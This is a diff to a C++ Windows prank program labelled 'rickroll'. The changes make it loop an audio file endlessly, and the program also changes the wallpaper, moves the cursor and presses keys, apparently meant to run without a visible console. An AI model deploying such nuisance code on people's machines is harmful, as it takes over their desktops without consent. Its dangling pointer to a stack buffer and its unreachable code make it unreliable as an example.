@@ -39,6 +39,11 @@ void MoveCursor() {
 }
 
 
+struct AudioRet {
+	bool isPlaying = true;
+	LPSTR timeToEnd;
+};
+
 
 bool ChangeVolume(double nVolume, bool bScalar)
 {
@@ -94,6 +99,7 @@ bool ChangeVolume(double nVolume, bool bScalar)
 DWORD WINAPI PlaySong(LPVOID lpParameter) {
 
 	char cCurrentPath[FILENAME_MAX];
+	AudioRet* RetStruct = reinterpret_cast<AudioRet*>(lpParameter);
 
 	if (!GetCurrentDir(cCurrentPath, sizeof(cCurrentPath)))
 	{
@@ -103,12 +109,24 @@ DWORD WINAPI PlaySong(LPVOID lpParameter) {
 	cCurrentPath[sizeof(cCurrentPath) - 1] = '\0'; /* not really required */
 
 	char outfilename[FILENAME_MAX] = "\\audio.mp3";
+
 	std::string main("open \"");//, "\" type mpegvideo alias mp3");
 	errno_t success = strcat_s(cCurrentPath, sizeof(cCurrentPath), outfilename);
 	main.append(cCurrentPath);
 	main.append("\" type mpegvideo alias mp3");
+
+	printf("Sent off command to mci: %s\n", main.c_str());
+
+
 	mciSendString(main.c_str(), NULL, 0, NULL);
+	
+	char buff[100];
+	mciSendString("status mp3 length", buff, sizeof(buff), NULL);
+	RetStruct->timeToEnd = buff;
+	
 	mciSendString("play mp3 wait", NULL, 0, NULL);
+	RetStruct->isPlaying = false;
+	
 	return 0;
 }
 
@@ -121,11 +139,11 @@ void SetWallpaper(LPCWSTR file) {
 	wOption.dwSize = sizeof(WALLPAPEROPT);
 	wOption.dwStyle = WPSTYLE_CENTER;
 	status = desktop->SetWallpaper(file, 0);
-	wprintf(L"%ld", status);
+	wprintf(L"SetWallpaper status: %ld\n", status);
 	status = desktop->SetWallpaperOptions(&wOption, 0);
-	wprintf(L"%ld", status);
+	wprintf(L"SetWallpaperOptions status: %ld\n", status);
 	status = desktop->ApplyChanges(AD_APPLY_ALL);
-	wprintf(L"%ld", status);
+	wprintf(L"Applied changes status: %ld\n", status);
 	desktop->Release();
 	CoUninitialize();
 }
@@ -224,12 +242,30 @@ size_t DownloadFile(std::string url, char* outfilename) {
 	return 1;
 }
 
-//int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
+//int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) // make sure to change this back after debug
 int main()
 {
-	HANDLE threadHandler = CreateThread(0, 0, PlaySong, NULL, 0, 0); // starts rickroll thread to get out of way for other routines to execute
-	Sleep(10000);
-	return 0;
+	bool SongPlaying = true;
+	AudioRet passoff;
+	HANDLE threadHandler = CreateThread(0, 0, PlaySong, reinterpret_cast<void*>(&passoff), 0, 0); // starts rickroll thread to get out of way for other routines to execute
+	Sleep(10000); // debug wait
+	while (true) {
+		if (passoff.isPlaying) {
+			printf("Length of track: %s\n", passoff.timeToEnd);
+			printf("SongPlaying value: %d\n", SongPlaying);
+			//printf((char*)SongPlaying);
+			Sleep(210173);
+			printf("TimerUP\n");
+		}
+		else {
+			printf("Song complete. Restarting lol"); 
+			threadHandler = CreateThread(0, 0, PlaySong, reinterpret_cast<void*>(&passoff), 0, 0); // starts rickroll thread to get out of way for other routines to execute
+			passoff.isPlaying = true;
+		}
+		
+	}
+	printf("Song complete. Exiting");
+	return 0; // debug cutout
 	int count = 0;
 	std::string url = "https://i.ytimg.com/vi/ibr6egCSqiE/maxresdefault.jpg";
 
@@ -261,6 +297,9 @@ int main()
 			KeyPress();
 		}
 		Sleep(2000); // Wait time
+	}
+	while (SongPlaying) {
+		Sleep(1000);
 	}
 	CloseHandle(threadHandler);
 
